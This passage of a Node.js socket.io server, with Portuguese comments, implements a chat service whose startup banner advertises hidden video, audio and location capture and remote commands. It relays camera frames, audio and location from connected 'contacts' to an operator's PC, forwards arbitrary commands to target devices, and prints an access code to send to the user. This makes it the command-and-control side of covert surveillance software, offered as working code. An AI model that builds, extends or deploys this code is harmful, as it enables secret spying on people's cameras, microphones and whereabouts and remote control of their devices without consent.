    console.log('✅ ' + contact.name + ' online');
  });

  socket.on('send_message', (data) => {
    const { to, text, isFromPc } = data;
    let from = null, senderName = null;

    if(isFromPc) {
      from = 'pc';
      senderName = 'PC';
      const msgs = messages.get(to) || [];
      const newMsg = { id: uuidv4(), from: 'pc', to, text, timestamp: new Date(), isRead: false };
      msgs.push(newMsg);
      messages.set(to, msgs);
      const contact = contacts.get(to);
      if(contact && contact.socketId) {
        io.to(contact.socketId).emit('new_message', newMsg);
      }
      socket.emit('message_sent', newMsg);
    } else {
      from = currentContactId;
      const contact = contacts.get(currentContactId);
      senderName = contact ? contact.name : 'User';
      const msgs = messages.get(currentContactId) || [];
      const newMsg = { id: uuidv4(), from: currentContactId, to: 'pc', text, timestamp: new Date(), isRead: false };
      msgs.push(newMsg);
      messages.set(currentContactId, msgs);
      io.emit('new_message_from_contact', { ...newMsg, contactName: senderName, contactId: currentContactId });
      socket.emit('message_sent', newMsg);
    }
    console.log('💬 ' + senderName + ': ' + text);
  });

  socket.on('typing_start', ({ to, isFromPc }) => {
    if(isFromPc) {
      const contact = contacts.get(to);
      if(contact && contact.socketId) io.to(contact.socketId).emit('contact_typing', { isTyping: true });
    } else {
      socket.broadcast.emit('contact_typing', { contactId: currentContactId, isTyping: true });
    }
  });

  socket.on('typing_stop', ({ to, isFromPc }) => {
    if(isFromPc) {
      const contact = contacts.get(to);
      if(contact && contact.socketId) io.to(contact.socketId).emit('contact_typing', { isTyping: false });
    } else {
      socket.broadcast.emit('contact_typing', { contactId: currentContactId, isTyping: false });
    }
  });

  socket.on('frame', (frameData) => {
    if(currentContactId) socket.broadcast.emit('contact_frame', { contactId: currentContactId, frame: frameData });
  });

  socket.on('audio', (audioData) => {
    if(currentContactId) socket.broadcast.emit('contact_audio', { contactId: currentContactId, audio: audioData });
  });

  socket.on('location', (loc) => {
    if(currentContactId) socket.broadcast.emit('contact_location', { contactId: currentContactId, location: loc });
  });

  socket.on('comando', ({ contactId, command }) => {
    const contact = contacts.get(contactId);
    if(contact && contact.socketId) {
      io.to(contact.socketId).emit('comando', command);
    }
  });

  socket.on('disconnect', () => {
    console.log('Client disconnected:', socket.id);
    if(currentContactId) {
      const contact = contacts.get(currentContactId);
      if(contact) {
        contact.online = false;
        contact.lastSeen = new Date();
        contact.socketId = null;
        io.emit('contact_status_change', { contactId: currentContactId, online: false, name: contact.name });
        console.log('❌ ' + contact.name + ' offline');
      }
    }
  });
});

// ========== INICIAR SERVIDOR ==========
server.listen(PORT, '0.0.0.0', () => {
  console.log('\n● CONTROL SYSTEM ACTIVE ●');
  console.log('   PORT: ' + PORT);
  console.log('   PC: http://localhost:' + PORT);
  console.log('   MOBILE: http://localhost:' + PORT);
  console.log('\n● FUNCTIONS:');
  console.log('   ✓ GENERATE ACCESS CODES');
  console.log('   ✓ REAL-TIME CHAT');
  console.log('   ✓ VIDEO/AUDIO/LOCATION (HIDDEN)');
  console.log('   ✓ REMOTE COMMANDS\n');

  setTimeout(() => {
    if(contacts.size === 0) {
      const id = uuidv4();
      contacts.set(id, { id, name: 'Demo User', phone: '(11) 99999-9999', socketId: null, online: false, lastSeen: new Date(), createdAt: new Date() });
      messages.set(id, []);
      console.log('● DEMO CODE GENERATED ●');
      console.log('   CODE: ' + id);
      console.log('   NAME: Demo User');
      console.log('\n   SEND THIS CODE TO THE USER\n');
    }
  }, 1000);
});
